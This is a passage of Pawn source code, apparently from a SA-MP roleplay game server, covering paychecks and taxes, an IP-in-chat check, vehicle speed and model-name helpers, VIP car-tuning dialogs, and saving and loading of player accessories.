stock Paycheck()
{
	// Paycheck
	foreach(Player, i)
	{
	    if(Logged(i))
	    {
	        if(Player[i][pMinutes] >= 45)
	        {
	            new string[128];
	            // Calculating Paycheck
		        new paycheck = Player[i][pLevel] * 1000;
		        new taxamount = (TaxPercent * paycheck) / 100;
		        new finalpaycheck = paycheck - taxamount;
				if(Player[i][pVIP] == 2) {finalpaycheck = finalpaycheck * (125/100);}
				if(Player[i][pVIP] == 3) {finalpaycheck = finalpaycheck * (150/100);}
				if(Player[i][pVIP] == 4) {finalpaycheck = finalpaycheck * (200/100);}
		    	new finaldaypaycheck = finalpaycheck * 125 / 100;
				if(Player[i][pMinutes] >= 80)
				{
                    if(DayRespect == 1)
                    {
			            Player[i][pExp] += 4;
					}
					else
					{
			    		Player[i][pExp] += 2;
			    	}
                    Player[i][pHours] ++;
		        }
		        else
		        {
                    if(DayRespect == 1)
                    {
			            Player[i][pExp] += 2;
					}
					else
					{
			    		Player[i][pExp] ++;
			    	}
		            Player[i][pHours] ++;
		        }
		        new oldbalance = Player[i][pBank];
		        TaxMoney += taxamount;
		        if(DayPaycheck == 1)
		        {
                   Player[i][pBank] += finaldaypaycheck;
                }
                else
                {
                   Player[i][pBank] += finalpaycheck;
                }
		        // Paycheck Report


		        format(string, sizeof(string), "|______________________________ Paycheck ______________________________|");
	    		SendClientMessage(i, COLOR_INT, string);
	    		format(string, sizeof(string), "{00C0FF}Minutes Played: {FFFFFF}%d {00C0FF}Level: {FFFFFF}%d  {00C0FF}Respect: {FFFFFF}%d", Player[i][pMinutes], Player[i][pLevel], Player[i][pExp]);
	    		SendClientMessage(i, COLOR_FADE1, string);
	    		if(DayPaycheck == 1)
	    		{
	    	    	format(string, sizeof(string), "{00C0FF}Paycheck: {FFFFFF}$%d  {00C0FF}Tax Amount: {FFFFFF}$%d (%d percent)  {00C0FF}Total Paycheck: {FFFFFF}$%d", paycheck, taxamount, TaxPercent, finaldaypaycheck);
			    	SendClientMessage(i, COLOR_FADE1, string);
			    }
			    else
			    {
                    format(string, sizeof(string), "{00C0FF}Paycheck: {FFFFFF}$%d  {00C0FF}Tax Amount: {FFFFFF}$%d (%d percent)  {00C0FF}Total Paycheck: {FFFFFF}$%d", paycheck, taxamount, TaxPercent, finalpaycheck);
			    	SendClientMessage(i, COLOR_FADE1, string);
			    }
	    		format(string, sizeof(string), "{00C0FF}Old Balance: {FFFFFF}$%d  {00C0FF}New Balance: {FFFFFF}$%d", oldbalance, Player[i][pBank]);
	    		SendClientMessage(i, COLOR_FADE1, string);
	    		if(Player[i][pFamed])
	    		{
					Player[i][pFamedPoints] ++;
                    format(string, sizeof(string), "You have gained a famed point, you have total of %d points.", Player[i][pFamedPoints]);
                    SendClientMessage(i, COLOR_ORANGE, string);
                }
                if(Player[i][pVIP])
	    		{
					Player[i][pVIPPoints] ++;
                    format(string, sizeof(string), "You have gained a vip point, you have total of %d points.", Player[i][pVIPPoints]);
                    SendClientMessage(i, COLOR_VIP, string);
                }
	    		if(Player[i][pMinutes] >= 90)
				{
                    new stack[4];
	            	if(Player[i][pVIPBuddy]) Player[i][pVIPBuddy] -= strval(stack);
				}
				else
				{
	            	if(Player[i][pVIPBuddy]) Player[i][pVIPBuddy] --;
				}
				// Clearing Playing Minutes
	    		Player[i][pMinutes] = 0;
    		}
    		else
			{
			    SendClientMessage(i, COLOR_LIGHTRED, " You haven't played long enough to recieve a paycheck.");
			}
			PayChecks = 1;
			SetTimer("PayCheckDone", 5000, false);
		}
    }
	return 1;
}

stock stringContainsIP(const szStr[])
{
    new
        iDots,
        i
    ;
    while(szStr[i] != EOS)
    {
        if('0' <= szStr[i] <= '9')
        {
            do
            {
                if(szStr[i] == '.')
                    iDots++;

                i++;
            }
            while(('0' <= szStr[i] <= '9') || szStr[i] == '.' || szStr[i] == ':');
        }
        if(iDots > 2)
            return 1;
        else
            iDots = 0;

        i++;
    }
    return 0;
}



// new function
stock RPIDFN(playername[])
{
  for(new i = 0; i <= MAX_PLAYERS; i++)
  {
    if(IsPlayerConnected(i))
    {
      new playername2[MAX_PLAYER_NAME];
      GetPlayerName(i, playername2, sizeof(playername2));
      if(strcmp(playername2, playername, true, strlen(playername)) == 0)
      {
        return i;
      }
    }
  }
  return INVALID_PLAYER_ID;
}

stock SetVehicleSpeed(vehicleid,mph) //Miles Per Hour
{
	new Float:Vx,Float:Vy,Float:Vz,Float:DV,Float:multiple;
	GetVehicleVelocity(vehicleid,Vx,Vy,Vz);
	DV = floatsqroot(Vx*Vx + Vy*Vy + Vz*Vz);
	if(DV > 0) //Directional velocity must be greater than 0 (display strobes if 0)
	{
		multiple = (mph / (DV * 100)); //Multiplying DV by 100 calculates speed in MPH
		return SetVehicleVelocity(vehicleid,Vx*multiple,Vy*multiple,Vz*multiple);
	}
	return 0;
}

stock ModifyVehicleSpeed(vehicleid,mph) //Miles Per Hour
{
	new Float:Vx,Float:Vy,Float:Vz,Float:DV,Float:multiple;
	GetVehicleVelocity(vehicleid,Vx,Vy,Vz);
	DV = floatsqroot(Vx*Vx + Vy*Vy + Vz*Vz);
	if(DV > 0) //Directional velocity must be greater than 0 (display strobes if 0)
	{
		multiple = ((mph + DV * 100) / (DV * 100)); //Multiplying DV by 100 calculates speed in MPH
		return SetVehicleVelocity(vehicleid,Vx*multiple,Vy*multiple,Vz*multiple);
	}
	return 0;
}

stock GetPlayerSpeed(playerid, get3d)
{
	new Float:x, Float:y, Float:z;
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid), x, y, z);
	else GetPlayerVelocity(playerid, x, y, z);
	return SpeedCheck(x, y, z, 100.0, get3d);
}

stock RVN(carid)
{
    new name[32];
	switch(carid)
	{
        case 0: format(name, sizeof(name), "None");
        case 400: format(name, sizeof(name), "Landstalker");
case 401: format(name, sizeof(name), "Bravura");
case 402: format(name, sizeof(name), "Buffalo");
case 403: format(name, sizeof(name), "Linerunner");
case 404: format(name, sizeof(name), "Perenail");
case 405: format(name, sizeof(name), "Sentinel");
case 406: format(name, sizeof(name), "Dumper");
case 407: format(name, sizeof(name), "Firetruck");
case 408: format(name, sizeof(name), "Trashmaster");
case 409: format(name, sizeof(name), "Stretch");
case 410: format(name, sizeof(name), "Manana");
case 411: format(name, sizeof(name), "Infernus");
case 412: format(name, sizeof(name), "Vodooo");
case 413: format(name, sizeof(name), "Pony");
case 414: format(name, sizeof(name), "Mule");
case 415: format(name, sizeof(name), "Cheetah");
case 416: format(name, sizeof(name), "Ambulance");
case 417: format(name, sizeof(name), "Leviathan");
case 418: format(name, sizeof(name), "Moonbeam");
case 419: format(name, sizeof(name), "Esperanto");
case 420: format(name, sizeof(name), "Taxi");
case 421: format(name, sizeof(name), "Washington");
case 422: format(name, sizeof(name), "Bobcat");
case 423: format(name, sizeof(name), "Mr Whoopee");
case 424: format(name, sizeof(name), "BF Injection");
case 425: format(name, sizeof(name), "Hunter");
case 426: format(name, sizeof(name), "Premier");
case 427: format(name, sizeof(name), "S.W.A.T Truck");
case 428: format(name, sizeof(name), "Securicar");
case 429: format(name, sizeof(name), "Banshee");
case 430: format(name, sizeof(name), "Predator");
case 431: format(name, sizeof(name), "Bus");
case 432: format(name, sizeof(name), "Rhino");
case 433: format(name, sizeof(name), "Barracks");
case 434: format(name, sizeof(name), "Hotknife");
case 435: format(name, sizeof(name), "Trailer");
case 436: format(name, sizeof(name), "Previon");
case 437: format(name, sizeof(name), "Coach");
case 438: format(name, sizeof(name), "Cabbie");
case 439: format(name, sizeof(name), "Stallion");
case 440: format(name, sizeof(name), "Rumpo");
case 441: format(name, sizeof(name), "RC Bandit");
case 442: format(name, sizeof(name), "Romero");
case 443: format(name, sizeof(name), "Packer");
case 444: format(name, sizeof(name), "Monster");
case 445: format(name, sizeof(name), "Admiral");
case 446: format(name, sizeof(name), "Squalo");
case 447: format(name, sizeof(name), "Seasparrow");
case 448: format(name, sizeof(name), "Pizza Boy");
case 449: format(name, sizeof(name), "Tram");
case 450: format(name, sizeof(name), "Trailer 2");
case 451: format(name, sizeof(name), "Turismo");
case 452: format(name, sizeof(name), "Speeder");
case 453: format(name, sizeof(name), "Refeer");
case 454: format(name, sizeof(name), "Tropic");
case 455: format(name, sizeof(name), "Flatbed");
case 456: format(name, sizeof(name), "Yankee");
case 457: format(name, sizeof(name), "Caddy");
case 458: format(name, sizeof(name), "Solair");
case 459: format(name, sizeof(name), "Top Fun");
case 460: format(name, sizeof(name), "Skimmer");
case 461: format(name, sizeof(name), "PCJ-600");
case 462: format(name, sizeof(name), "Faggio");
case 463: format(name, sizeof(name), "Freeway");
case 464: format(name, sizeof(name), "RC Baron");
case 465: format(name, sizeof(name), "RC Raider");
case 466: format(name, sizeof(name), "Glendade");
case 467: format(name, sizeof(name), "Oceanic");
case 468: format(name, sizeof(name), "Sanchez");
case 469: format(name, sizeof(name), "Sparrow");
case 470: format(name, sizeof(name), "Patriot");
case 471: format(name, sizeof(name), "Quad");
case 472: format(name, sizeof(name), "Coastguard");
case 473: format(name, sizeof(name), "Dinghy");
case 474: format(name, sizeof(name), "Hermes");
case 475: format(name, sizeof(name), "Sabre");
case 476: format(name, sizeof(name), "Rustler");
case 477: format(name, sizeof(name), "ZR-350");
case 478: format(name, sizeof(name), "Walton");
case 479: format(name, sizeof(name), "Regina");
case 480: format(name, sizeof(name), "Comet");
case 481: format(name, sizeof(name), "BMX");
case 482: format(name, sizeof(name), "Burrito");
case 483: format(name, sizeof(name), "Camper");
case 484: format(name, sizeof(name), "Marquis");
case 485: format(name, sizeof(name), "Baggage");
case 486: format(name, sizeof(name), "Dozer");
case 487: format(name, sizeof(name), "Maverick");
case 488: format(name, sizeof(name), "News Maverick");
case 489: format(name, sizeof(name), "Rancher");
case 490: format(name, sizeof(name), "Federal Rancher");
case 491: format(name, sizeof(name), "Virgo");
case 492: format(name, sizeof(name), "Greenwood");
case 493: format(name, sizeof(name), "Jetmax");
case 494: format(name, sizeof(name), "Hotring");
case 495: format(name, sizeof(name), "Sandking");
case 496: format(name, sizeof(name), "Blista Impact");
case 497: format(name, sizeof(name), "Police Maverick");
case 498: format(name, sizeof(name), "Boxville");
case 499: format(name, sizeof(name), "Benson");
case 500: format(name, sizeof(name), "Mesa");
case 501: format(name, sizeof(name), "RC Goblin");
case 502: format(name, sizeof(name), "Hotring A");
case 503: format(name, sizeof(name), "Hotring B");
case 504: format(name, sizeof(name), "Blooding Banger");
case 505: format(name, sizeof(name), "Rancher");
case 506: format(name, sizeof(name), "Super GT");
case 507: format(name, sizeof(name), "Elegant");
case 508: format(name, sizeof(name), "Journey");
case 509: format(name, sizeof(name), "Bike");
case 510: format(name, sizeof(name), "Mountain Bike");
case 511: format(name, sizeof(name), "Beagle");
case 512: format(name, sizeof(name), "Cropduster");
case 513: format(name, sizeof(name), "Stuntplane");
case 514: format(name, sizeof(name), "Petrol");
case 515: format(name, sizeof(name), "Roadtrain");
case 516: format(name, sizeof(name), "Nebula");
case 517: format(name, sizeof(name), "Majestic");
case 518: format(name, sizeof(name), "Buccaneer");
case 519: format(name, sizeof(name), "Shamal");
case 520: format(name, sizeof(name), "Hydra");
case 521: format(name, sizeof(name), "FCR-300");
case 522: format(name, sizeof(name), "NRG-500");
case 523: format(name, sizeof(name), "HPV-1000");
case 524: format(name, sizeof(name), "Cement Truck");
case 525: format(name, sizeof(name), "Towtruck");
case 526: format(name, sizeof(name), "Fortune");
case 527: format(name, sizeof(name), "Cadrona");
case 528: format(name, sizeof(name), "Federal Truck");
case 529: format(name, sizeof(name), "Williard");
case 530: format(name, sizeof(name), "Fork Lift");
case 531: format(name, sizeof(name), "Tractor");
case 532: format(name, sizeof(name), "Combine");
case 533: format(name, sizeof(name), "Feltzer");
case 534: format(name, sizeof(name), "Remington");
case 535: format(name, sizeof(name), "Slamvan");
case 536: format(name, sizeof(name), "Blade");
case 537: format(name, sizeof(name), "Freight");
case 538: format(name, sizeof(name), "Streak");
case 539: format(name, sizeof(name), "Vortex");
case 540: format(name, sizeof(name), "Vincent");
case 541: format(name, sizeof(name), "Bullet");
case 542: format(name, sizeof(name), "Clover");
case 543: format(name, sizeof(name), "Sadler");
case 544: format(name, sizeof(name), "Stairs Firetruck");
case 545: format(name, sizeof(name), "Hustler");
case 546: format(name, sizeof(name), "Intruder");
case 547: format(name, sizeof(name), "Primo");
case 548: format(name, sizeof(name), "Cargobob");
case 549: format(name, sizeof(name), "Tampa");
case 550: format(name, sizeof(name), "Sunrise");
case 551: format(name, sizeof(name), "Merit");
case 552: format(name, sizeof(name), "Utility Van");
case 553: format(name, sizeof(name), "Nevada");
case 554: format(name, sizeof(name), "Yosemite");
case 555: format(name, sizeof(name), "Windsor");
case 556: format(name, sizeof(name), "Monster A");
case 557: format(name, sizeof(name), "Monster B");
case 558: format(name, sizeof(name), "Uranus");
case 559: format(name, sizeof(name), "Jester");
case 560: format(name, sizeof(name), "Sultan");
case 561: format(name, sizeof(name), "Stratum");
case 562: format(name, sizeof(name), "Elegy");
case 563: format(name, sizeof(name), "Raindance");
case 564: format(name, sizeof(name), "RC Tiger");
case 565: format(name, sizeof(name), "Flash");
case 566: format(name, sizeof(name), "Tahoma");
case 567: format(name, sizeof(name), "Savanna");
case 568: format(name, sizeof(name), "Bandito");
case 569: format(name, sizeof(name), "Freight Flat");
case 570: format(name, sizeof(name), "Streak");
case 571: format(name, sizeof(name), "Kart");
case 572: format(name, sizeof(name), "Mower");
case 573: format(name, sizeof(name), "Duneride");
case 574: format(name, sizeof(name), "Sweeper");
case 575: format(name, sizeof(name), "Broadway");
case 576: format(name, sizeof(name), "Tornado");
case 577: format(name, sizeof(name), "AT-400");
case 578: format(name, sizeof(name), "DFT-30");
case 579: format(name, sizeof(name), "Huntley");
case 580: format(name, sizeof(name), "Stafford");
case 581: format(name, sizeof(name), "BF-400");
case 582: format(name, sizeof(name), "Raindance");
case 583: format(name, sizeof(name), "News Van");
case 584: format(name, sizeof(name), "Tug");
case 585: format(name, sizeof(name), "Petrol Tanker");
case 586: format(name, sizeof(name), "Wayfarer");
case 587: format(name, sizeof(name), "Euros");
case 588: format(name, sizeof(name), "Hotdog");
case 589: format(name, sizeof(name), "Club");
case 590: format(name, sizeof(name), "Freight Box");
case 591: format(name, sizeof(name), "Trailer 3");
case 592: format(name, sizeof(name), "Andromada");
case 593: format(name, sizeof(name), "Dodo");
case 594: format(name, sizeof(name), "RC Cam");
case 595: format(name, sizeof(name), "Launch");
case 596: format(name, sizeof(name), "LSPD Patrol Car");
case 597: format(name, sizeof(name), "FBI Patrol Car");
case 598: format(name, sizeof(name), "NG Patrol Car");
case 599: format(name, sizeof(name), "LSPD Patrol Ranger");
case 600: format(name, sizeof(name), "Picador");
case 601: format(name, sizeof(name), "S.W.A.T Tank");
case 602: format(name, sizeof(name), "Alpha");
case 603: format(name, sizeof(name), "Phoenix");
case 609: format(name, sizeof(name), "Boxville");

	}
    return name;
}

// BEGIN OF VIP TUNING
stock CarmodDialog(playerid)
{
	ShowPlayerDialog(playerid,1111,DIALOG_STYLE_LIST,"Select things to put in your car","Nitro\nCar Color\nWheels\nStereo\nHydraulics\nCar Components","Select","Cancel");
	return 1;
}
stock Lowrider(playerid)
{
    ShowPlayerDialog(playerid,1001,DIALOG_STYLE_LIST,"Choose one","Paintjob\nChrome\nSlamin\n{FF0000}Back","Select","Cancel");
    return 1;
}
stock RegularCarDialog(playerid)
{
    new vehmd = GetVehicleModel(GetPlayerVehicleID(playerid));
 	new string[128];
	if(vehmd == 401 || vehmd == 496 || vehmd == 518 || vehmd == 540 || vehmd == 546 || vehmd == 589)
	{string = "Spoiler\nHood\nRoof\nVents\nSideskirt\nLights\n{FF0000}Back";}
	else if(vehmd == 549)
	{string = "Spoiler\nHood\nVents\nSideskirt\nLights\n{FF0000}Back";}
	else if(vehmd == 550)
	{string = "Spoiler\nHood\nRoof\nVents\nLights\n{FF0000}Back";}
	else if(vehmd == 585 || vehmd == 603)
	{string = "Spoiler\nRoof\nVents\nSideskirt\nLights\n{FF0000}Back";}
	else if(vehmd == 410 || vehmd == 436)
	{string = "Spoiler\nRoof\nSideskirt\nLights\n{FF0000}Back";}
	else if(vehmd == 439 || vehmd == 458)
	{string = "Spoiler\nVents\nSideskirt\nLights\n{FF0000}Back";}
	else if(vehmd == 551 || vehmd == 492 || vehmd == 529)
	{string = "Spoiler\nHood\nRoof\nSideskirt\n{FF0000}Back";}
	else if(vehmd == 489 || vehmd == 505)
	{string = "Spoiler\nHood\nRoof\nLights\n{FF0000}Back";}
	else if(vehmd == 516)
	{string = "Spoiler\nHood\nSideskirt\n{FF0000}Back";}
	else if(vehmd == 491 || vehmd == 517)
	{string = "Spoiler\nVents\nSideskirt\n{FF0000}Back";}
	else if(vehmd == 418 || vehmd == 527 || vehmd == 580)
	{string = "Spoiler\nRoof\nSideskirt\n{FF0000}Back";}
	else if(vehmd == 420 || vehmd == 587)
	{string = "Spoiler\nHood\n{FF0000}Back";}
	else if(vehmd == 547)
	{string = "Spoiler\nVents\n{FF0000}Back";}
	else if(vehmd == 415)
	{string = "Spoiler\nSideskirt\n{FF0000}Back";}

    ShowPlayerDialog(playerid,1004,DIALOG_STYLE_LIST,"Choose one",string,"Select","Cancel");
    return 1;
}
stock Mod(playerid)//Alien
{
    ShowPlayerDialog(playerid,1511,DIALOG_STYLE_LIST,"Choose one","Right Sideskirt\nLeft Sideskirt\nExhaust\nRoof\nSpoiler\nFront Bumper\nRear Bumper\n{FF0000}Back","Select","Cancle");
    return 1;
}
stock Mod1(playerid)//X-Flow
{
	ShowPlayerDialog(playerid,1512,DIALOG_STYLE_LIST,"Choose one","Right Sideskirt\nLeft Sideskirt\nExhaust\nRoof\nSpoiler\nFront Bumper\nRear Bumper\n{FF0000}Back","Select","Cancle");
	return 1;
}
stock Mod2(playerid)//Chrome
{
    new vehmd = GetVehicleModel(GetPlayerVehicleID(playerid));
    new string[128];
	if(vehmd == 576 || vehmd == 575)
	{string = "Right Sideskirt\nLeft Sideskirt\nExhaust\nFront Bumper\nRear Bumper\n{FF0000}Back";}
	else if(vehmd == 535)
	{string = "Front Bullbars\nRear Bullbars\nExhaust\nFront Bumper\nRight Sideskirt\nLeft Sideskirt\n{FF0000}Back";}
	else if(vehmd == 567 || vehmd == 536)
	{string = "Exhaust\nRight Sideskirt\nLeft Sideskirt\nRear Bumper\nFront Bumper\n{FF0000}Back";}
	else if(vehmd == 534)
	{string = "Grill\nBars\nLights\nExhaust\nFront Bumper\nRear Bumper\n{FF0000}Back";}

    ShowPlayerDialog(playerid,1513,DIALOG_STYLE_LIST,"Choose one",string,"Select","Cancle");
	return 1;
}
stock Mod3(playerid)//Slamin
{
    new vehmd = GetVehicleModel(GetPlayerVehicleID(playerid));
    new string[128];
    if(vehmd == 575 || vehmd == 576)
	{string = "Exhaust\nFront Bumper\nRear Bumper\n{FF0000}Back";}
	else if(vehmd == 535)
	{string = "Rear Bullbars\nFront Bullbars\nExhaust\nRight Sideskirt\nLeft Sidedkirt\n{FF0000}Back";}
	else if(vehmd == 567 || vehmd == 536 || vehmd == 534)
	{string = "Front Bumper\nRear Bumper\nExhaust\n{FF0000}Back";}
    ShowPlayerDialog(playerid,1514,DIALOG_STYLE_LIST,"Choose one",string,"Select","Cancle");
    return 1;
}
// END OF VIP TUNING


forward CrouchCheck(playerid);
public CrouchCheck(playerid) {
	CheckCrouch[playerid] = 0;
	return 1;
}


stock SaveToys(playerid, file[])
{
	// Toys Model
	dini_IntSet(file, "tModel0", Player[playerid][pToyModel][0]);
	dini_IntSet(file, "tModel1", Player[playerid][pToyModel][1]);
	dini_IntSet(file, "tModel2", Player[playerid][pToyModel][2]);
	dini_IntSet(file, "tModel3", Player[playerid][pToyModel][3]);
	dini_IntSet(file, "tModel4", Player[playerid][pToyModel][4]);
	dini_IntSet(file, "tModel5", Player[playerid][pToyModel][5]);
	dini_IntSet(file, "tModel6", Player[playerid][pToyModel][6]);
	dini_IntSet(file, "tModel7", Player[playerid][pToyModel][7]);
	dini_IntSet(file, "tModel8", Player[playerid][pToyModel][8]);
	dini_IntSet(file, "tModel9", Player[playerid][pToyModel][9]);
	// Toys X
	dini_FloatSet(file, "tX0", Player[playerid][pToyX][0]);	dini_FloatSet(file, "tX1", Player[playerid][pToyX][1]);	dini_FloatSet(file, "tX2", Player[playerid][pToyX][2]);	dini_FloatSet(file, "tX3", Player[playerid][pToyX][3]);
	dini_FloatSet(file, "tX4", Player[playerid][pToyX][4]);	dini_FloatSet(file, "tX5", Player[playerid][pToyX][5]);	dini_FloatSet(file, "tX6", Player[playerid][pToyX][6]);	dini_FloatSet(file, "tX7", Player[playerid][pToyX][7]);
	dini_FloatSet(file, "tX8", Player[playerid][pToyX][8]);	dini_FloatSet(file, "tX9", Player[playerid][pToyX][9]);
	// Toys Y
	dini_FloatSet(file, "tY0", Player[playerid][pToyY][0]);	dini_FloatSet(file, "tY1", Player[playerid][pToyY][1]);	dini_FloatSet(file, "tY2", Player[playerid][pToyY][2]);	dini_FloatSet(file, "tY3", Player[playerid][pToyY][3]);
	dini_FloatSet(file, "tY4", Player[playerid][pToyY][4]);	dini_FloatSet(file, "tY5", Player[playerid][pToyY][5]);	dini_FloatSet(file, "tY6", Player[playerid][pToyY][6]);	dini_FloatSet(file, "tY7", Player[playerid][pToyY][7]);
	dini_FloatSet(file, "tY8", Player[playerid][pToyY][8]); dini_FloatSet(file, "tY9", Player[playerid][pToyY][9]);
	// Toy Z
	dini_FloatSet(file, "tZ0", Player[playerid][pToyZ][0]);	dini_FloatSet(file, "tZ1", Player[playerid][pToyZ][1]);	dini_FloatSet(file, "tZ2", Player[playerid][pToyZ][2]);	dini_FloatSet(file, "tZ3", Player[playerid][pToyZ][3]);
	dini_FloatSet(file, "tZ4", Player[playerid][pToyZ][4]);	dini_FloatSet(file, "tZ5", Player[playerid][pToyZ][5]);	dini_FloatSet(file, "tZ6", Player[playerid][pToyZ][6]);	dini_FloatSet(file, "tZ7", Player[playerid][pToyZ][7]);
	dini_FloatSet(file, "tZ8", Player[playerid][pToyZ][8]);	dini_FloatSet(file, "tZ9", Player[playerid][pToyZ][9]);
	// Toy RX
	dini_FloatSet(file, "tRX0", Player[playerid][pToyRX][0]); dini_FloatSet(file, "tRX1", Player[playerid][pToyRX][1]);	dini_FloatSet(file, "tRX2", Player[playerid][pToyRX][2]); dini_FloatSet(file, "tRX3", Player[playerid][pToyRX][3]);
	dini_FloatSet(file, "tRX4", Player[playerid][pToyRX][4]); dini_FloatSet(file, "tRX5", Player[playerid][pToyRX][5]);	dini_FloatSet(file, "tRX6", Player[playerid][pToyRX][6]); dini_FloatSet(file, "tRX7", Player[playerid][pToyRX][7]);
	dini_FloatSet(file, "tRX8", Player[playerid][pToyRX][8]); dini_FloatSet(file, "tRX9", Player[playerid][pToyRX][9]);
	// Toy RY
	dini_FloatSet(file, "tRY0", Player[playerid][pToyRY][0]); dini_FloatSet(file, "tRY1", Player[playerid][pToyRY][1]);	dini_FloatSet(file, "tRY2", Player[playerid][pToyRY][2]); dini_FloatSet(file, "tRY3", Player[playerid][pToyRY][3]);
	dini_FloatSet(file, "tRY4", Player[playerid][pToyRY][4]); dini_FloatSet(file, "tRY5", Player[playerid][pToyRY][5]);	dini_FloatSet(file, "tRY6", Player[playerid][pToyRY][6]); dini_FloatSet(file, "tRY7", Player[playerid][pToyRY][7]);
	dini_FloatSet(file, "tRY8", Player[playerid][pToyRY][8]); dini_FloatSet(file, "tRY9", Player[playerid][pToyRY][9]);
	// Toy RZ
	dini_FloatSet(file, "tRZ0", Player[playerid][pToyRZ][0]); dini_FloatSet(file, "tRZ1", Player[playerid][pToyRZ][1]);	dini_FloatSet(file, "tRZ2", Player[playerid][pToyRZ][2]); dini_FloatSet(file, "tRZ3", Player[playerid][pToyRZ][3]);
	dini_FloatSet(file, "tRZ4", Player[playerid][pToyRZ][4]); dini_FloatSet(file, "tRZ5", Player[playerid][pToyRZ][5]);	dini_FloatSet(file, "tRZ6", Player[playerid][pToyRZ][6]); dini_FloatSet(file, "tRZ7", Player[playerid][pToyRZ][7]);
	dini_FloatSet(file, "tRZ8", Player[playerid][pToyRZ][8]); dini_FloatSet(file, "tRZ9", Player[playerid][pToyRZ][9]);
	// Toy SX
	dini_FloatSet(file, "tSX0", Player[playerid][pToySX][0]); dini_FloatSet(file, "tSX1", Player[playerid][pToySX][1]);	dini_FloatSet(file, "tSX2", Player[playerid][pToySX][2]); dini_FloatSet(file, "tSX3", Player[playerid][pToySX][3]);
	dini_FloatSet(file, "tSX4", Player[playerid][pToySX][4]); dini_FloatSet(file, "tSX5", Player[playerid][pToySX][5]);	dini_FloatSet(file, "tSX6", Player[playerid][pToySX][6]); dini_FloatSet(file, "tSX7", Player[playerid][pToySX][7]);
	dini_FloatSet(file, "tSX8", Player[playerid][pToySX][8]); dini_FloatSet(file, "tSX9", Player[playerid][pToySX][9]);
	// Toy SY
	dini_FloatSet(file, "tSY0", Player[playerid][pToySY][0]); dini_FloatSet(file, "tSY1", Player[playerid][pToySY][1]);	dini_FloatSet(file, "tSY2", Player[playerid][pToySY][2]); dini_FloatSet(file, "tSY3", Player[playerid][pToySY][3]);
	dini_FloatSet(file, "tSY4", Player[playerid][pToySY][4]); dini_FloatSet(file, "tSY5", Player[playerid][pToySY][5]);	dini_FloatSet(file, "tSY6", Player[playerid][pToySY][6]); dini_FloatSet(file, "tSY7", Player[playerid][pToySY][7]);
	dini_FloatSet(file, "tSY8", Player[playerid][pToySY][8]); dini_FloatSet(file, "tSY9", Player[playerid][pToySY][9]);
	// Toy SZ
	dini_FloatSet(file, "tSZ0", Player[playerid][pToySZ][0]); dini_FloatSet(file, "tSZ1", Player[playerid][pToySZ][1]);	dini_FloatSet(file, "tSZ2", Player[playerid][pToySZ][2]); dini_FloatSet(file, "tSZ3", Player[playerid][pToySZ][3]);
	dini_FloatSet(file, "tSZ4", Player[playerid][pToySZ][4]); dini_FloatSet(file, "tSZ5", Player[playerid][pToySZ][5]);	dini_FloatSet(file, "tSZ6", Player[playerid][pToySZ][6]); dini_FloatSet(file, "tSZ7", Player[playerid][pToySZ][7]);
	dini_FloatSet(file, "tSZ8", Player[playerid][pToySZ][8]); dini_FloatSet(file, "tSZ9", Player[playerid][pToySZ][9]);
	return 1;
}

stock LoadToys(playerid, file[])
{
	// Toys
	Player[playerid][pToyModel][0] = dini_Int(file, "tModel0");
	Player[playerid][pToyModel][1] = dini_Int(file, "tModel1");
	Player[playerid][pToyModel][2] = dini_Int(file, "tModel2");
	Player[playerid][pToyModel][3] = dini_Int(file, "tModel3");
	Player[playerid][pToyModel][4] = dini_Int(file, "tModel4");
	Player[playerid][pToyModel][5] = dini_Int(file, "tModel5");
	Player[playerid][pToyModel][6] = dini_Int(file, "tModel6");
	Player[playerid][pToyModel][7] = dini_Int(file, "tModel7");
	Player[playerid][pToyModel][8] = dini_Int(file, "tModel8");
	Player[playerid][pToyModel][9] = dini_Int(file, "tModel9");
	// Toys X
	Player[playerid][pToyX][0] = dini_Float(file, "tX0"); Player[playerid][pToyX][1] = dini_Float(file, "tX1");	Player[playerid][pToyX][2] = dini_Float(file, "tX2"); Player[playerid][pToyX][3] = dini_Float(file, "tX3");
	Player[playerid][pToyX][4] = dini_Float(file, "tX4"); Player[playerid][pToyX][5] = dini_Float(file, "tX5");	Player[playerid][pToyX][6] = dini_Float(file, "tX6"); Player[playerid][pToyX][7] = dini_Float(file, "tX7");
	Player[playerid][pToyX][8] = dini_Float(file, "tX8"); Player[playerid][pToyX][9] = dini_Float(file, "tX9");
	// Toys Y
	Player[playerid][pToyY][0] = dini_Float(file, "tY0"); Player[playerid][pToyY][1] = dini_Float(file, "tY1");	Player[playerid][pToyY][2] = dini_Float(file, "tY2"); Player[playerid][pToyY][3] = dini_Float(file, "tY3");
	Player[playerid][pToyY][4] = dini_Float(file, "tY4"); Player[playerid][pToyY][5] = dini_Float(file, "tY5");	Player[playerid][pToyY][6] = dini_Float(file, "tY6"); Player[playerid][pToyY][7] = dini_Float(file, "tY7");
	Player[playerid][pToyY][8] = dini_Float(file, "tY8"); Player[playerid][pToyY][9] = dini_Float(file, "tY9");
	// Toy Z
	Player[playerid][pToyZ][0] = dini_Float(file, "tZ0"); Player[playerid][pToyZ][1] = dini_Float(file, "tZ1");	Player[playerid][pToyZ][2] = dini_Float(file, "tZ2"); Player[playerid][pToyZ][3] = dini_Float(file, "tZ3");
	Player[playerid][pToyZ][4] = dini_Float(file, "tZ4"); Player[playerid][pToyZ][5] = dini_Float(file, "tZ5");	Player[playerid][pToyZ][6] = dini_Float(file, "tZ6"); Player[playerid][pToyZ][7] = dini_Float(file, "tZ7");
	Player[playerid][pToyZ][8] = dini_Float(file, "tZ8"); Player[playerid][pToyZ][9] = dini_Float(file, "tZ9");
	// Toy RX
	Player[playerid][pToyRX][0] = dini_Float(file, "tRX0"); Player[playerid][pToyRX][1] = dini_Float(file, "tRX1");	Player[playerid][pToyRX][2] = dini_Float(file, "tRX2"); Player[playerid][pToyRX][3] = dini_Float(file, "tRX3");
	Player[playerid][pToyRX][4] = dini_Float(file, "tRX4"); Player[playerid][pToyRX][5] = dini_Float(file, "tRX5");	Player[playerid][pToyRX][6] = dini_Float(file, "tRX6"); Player[playerid][pToyRX][7] = dini_Float(file, "tRX7");
	Player[playerid][pToyRX][8] = dini_Float(file, "tRX8"); Player[playerid][pToyRX][9] = dini_Float(file, "tRX9");
	// Toy RY
	Player[playerid][pToyRY][0] = dini_Float(file, "tRY0");	Player[playerid][pToyRY][1] = dini_Float(file, "tRY1");	Player[playerid][pToyRY][2] = dini_Float(file, "tRY2");	Player[playerid][pToyRY][3] = dini_Float(file, "tRY3");
